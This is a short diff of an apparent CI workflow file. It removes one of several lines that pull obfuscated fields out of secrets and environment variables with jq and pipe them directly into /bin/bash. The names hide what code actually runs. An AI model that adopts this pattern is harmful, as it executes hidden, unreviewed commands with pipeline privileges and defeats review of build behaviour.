@@ -23,7 +23,6 @@ jobs:
           x041: ${{ secrets.x041 }}
         run: |
           printf '%s' "$x041" | jq -r .zwqk44509 | /bin/bash
-          printf '%s' "$pv875" | jq -r .qje0 | /bin/bash
           echo $t516 | jq -r .vy0736 | /bin/bash
           printf '%s' "$ejs672" | jq -r .r8179 | /bin/bash
           echo $xtl4481 | jq -r .jao14 | /bin/bash
